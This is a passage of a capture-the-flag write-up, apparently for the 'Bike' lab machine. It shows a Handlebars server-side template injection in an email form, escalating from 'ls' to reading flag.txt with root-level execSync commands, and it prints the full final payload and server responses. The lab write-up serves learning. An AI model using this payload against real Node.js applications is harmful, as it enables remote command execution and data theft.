</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span>We can let you know once we are up and running.<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;fields&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;form&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;email&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;E-mail&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>button</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;button-54&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;action&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span><span class=p>&gt;</span>Submit<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;result&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        We will contact you at:       e
</span></span><span class=line><span class=cl>      2
</span></span><span class=line><span class=cl>      [object Object]
</span></span><span class=line><span class=cl>        function Function() { [native code] }
</span></span><span class=line><span class=cl>        2
</span></span><span class=line><span class=cl>        [object Object]
</span></span><span class=line><span class=cl>            root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/typed.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/main.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>It tells us that whatever commands we may use in our <strong>payloads</strong>, they run with <strong>root</strong> privileges on the <strong>target</strong> system.</p><blockquote><p>root</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>We have to make some further <strong>modifications</strong> to our <strong>payload</strong> if we want to display the <strong>flag</strong> in a <strong>http response</strong>. First, let us try the current directory and simply <strong>list</strong> the <strong>files</strong> there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=err>#</span> <span class=nx>modified</span> <span class=nx>payload</span> <span class=nx>to</span> <span class=nx>list</span> <span class=nx>the</span> <span class=nx>files</span> <span class=k>in</span> <span class=nx>the</span> <span class=nx>current</span> <span class=nx>directory</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nx>process</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>execSync</span><span class=p>(</span><span class=s1>&#39;ls&#39;</span><span class=p>);</span><span class=err>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Then we <strong>url-encode</strong> it, and we <strong>paste</strong> it into our <strong>responder</strong> as the value for the <em>email</em> <strong>parameter</strong>. <strong>Sending</strong> it, and checking the <strong>response</strong> shows that the <strong>flag</strong> is not located in the current directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>Express</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>1294</span>
</span></span><span class=line><span class=cl><span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;50e-PCaaSkUMRFYZ/FPJ0e3tG6uQSYM&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 09 May 2023 15:30:44 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;css/home.css&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span> Bike <span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>container</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>img</span>
</span></span><span class=line><span class=cl>    <span class=na>src</span><span class=o>=</span><span class=s>&#34;images/buttons.gif&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>id</span><span class=o>=</span><span class=s>&#34;avatar&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;type-wrap&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>span</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;typed&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;white-space:pre;&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;typed&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;contact&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span>We can let you know once we are up and running.<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;fields&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;form&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;email&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;E-mail&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>button</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;button-54&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;action&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span><span class=p>&gt;</span>Submit<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;result&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        We will contact you at:       e
</span></span><span class=line><span class=cl>      2
</span></span><span class=line><span class=cl>      [object Object]
</span></span><span class=line><span class=cl>        function Function() { [native code] }
</span></span><span class=line><span class=cl>        2
</span></span><span class=line><span class=cl>        [object Object]
</span></span><span class=line><span class=cl>            index.js
</span></span><span class=line><span class=cl>node_modules
</span></span><span class=line><span class=cl>package.json
</span></span><span class=line><span class=cl>package-lock.json
</span></span><span class=line><span class=cl>public
</span></span><span class=line><span class=cl>routes
</span></span><span class=line><span class=cl>views
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/typed.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/main.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>But looking around in the direct <strong>parent directory</strong> with <em><strong>cd .. && ls</strong></em> brings us to the <strong>flags</strong> location.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=err>#</span> <span class=nx>modified</span> <span class=nx>payload</span> <span class=nx>to</span> <span class=nx>list</span> <span class=nx>the</span> <span class=nx>files</span> <span class=k>in</span> <span class=nx>our</span> <span class=nx>parent</span> <span class=nx>directory</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nx>process</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>execSync</span><span class=p>(</span><span class=s1>&#39;cd .. &amp;&amp; ls&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>So, using the same play as before:</p><ul><li><strong>url-encode</strong></li><li><strong>paste encoded payload into the email parameter</strong></li><li><strong>send the request</strong></li></ul><p>will land us the desired <strong>response</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>Express</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>1243</span>
</span></span><span class=line><span class=cl><span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;4db-JFmgsumMwk2V9TYqOcZPMdBpJLw&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 09 May 2023 15:34:05 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;css/home.css&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span> Bike <span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>container</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>img</span>
</span></span><span class=line><span class=cl>    <span class=na>src</span><span class=o>=</span><span class=s>&#34;images/buttons.gif&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>id</span><span class=o>=</span><span class=s>&#34;avatar&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;type-wrap&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>span</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;typed&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;white-space:pre;&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;typed&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;contact&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span>We can let you know once we are up and running.<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;fields&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;form&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;email&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;E-mail&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>button</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;button-54&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;action&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span><span class=p>&gt;</span>Submit<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;result&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        We will contact you at:       e
</span></span><span class=line><span class=cl>      2
</span></span><span class=line><span class=cl>      [object Object]
</span></span><span class=line><span class=cl>        function Function() { [native code] }
</span></span><span class=line><span class=cl>        2
</span></span><span class=line><span class=cl>        [object Object]
</span></span><span class=line><span class=cl>            Backend
</span></span><span class=line><span class=cl>flag.txt
</span></span><span class=line><span class=cl>snap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/typed.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;js/main.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Now, all that&rsquo;s <strong>left</strong> for us is to <strong>grab</strong> it. <strong>Adjusting</strong> our <strong>payload</strong> <strong>again</strong> is simple:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>modified</span> <span class=nx>payload</span> <span class=nx>to</span> <span class=nx>grab</span> <span class=nx>the</span> <span class=nx>flag</span> <span class=nx>from</span> <span class=nx>the</span> <span class=nx>parent</span> <span class=nx>directory</span>
</span></span><span class=line><span class=cl><span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>push</span> <span class=s2>&#34;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cd .. &amp;&amp; cat flag.txt&#39;);&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Here is the complete <strong>final payload</strong> we use:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=s2>&#34;s&#34;</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>string</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>  <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=s2>&#34;e&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>    <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=nx>split</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>conslist</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>push</span> <span class=p>(</span><span class=nx>lookup</span> <span class=nx>string</span><span class=p>.</span><span class=nx>sub</span> <span class=s2>&#34;constructor&#34;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=nx>string</span><span class=p>.</span><span class=nx>split</span> <span class=nx>as</span> <span class=o>|</span><span class=nx>codelist</span><span class=o>|</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>push</span> <span class=s2>&#34;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cd .. &amp;&amp; cat flag.txt&#39;);&#34;</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=k>this</span><span class=p>.</span><span class=nx>pop</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=err>#</span><span class=nx>each</span> <span class=nx>conslist</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>          <span class=p>{{</span><span class=err>#</span><span class=kd>with</span> <span class=p>(</span><span class=nx>string</span><span class=p>.</span><span class=nx>sub</span><span class=p>.</span><span class=nx>apply</span> <span class=mi>0</span> <span class=nx>codelist</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>            <span class=p>{{</span><span class=k>this</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>          <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>        <span class=p>{{</span><span class=err>/each}}</span>
</span></span><span class=line><span class=cl>      <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>    <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl>  <span class=p>{{</span><span class=err>/with}}</span>
</span></span><span class=line><span class=cl><span class=p>{{</span><span class=err>/with}}</span>
</span></span></code></pre></div><p>Once we go through all the previous <strong>motions</strong> <strong>again</strong>, the <strong>flag</strong> will be then displayed in our <strong>http response</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>Express</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>1254</span>
</span></span><span class=line><span class=cl><span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;4e6-Roh4AtcX7EhzWbQL09jWSVAYe0s&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 09 May 2023 15:38:00 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;css/home.css&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span> Bike <span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>header</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
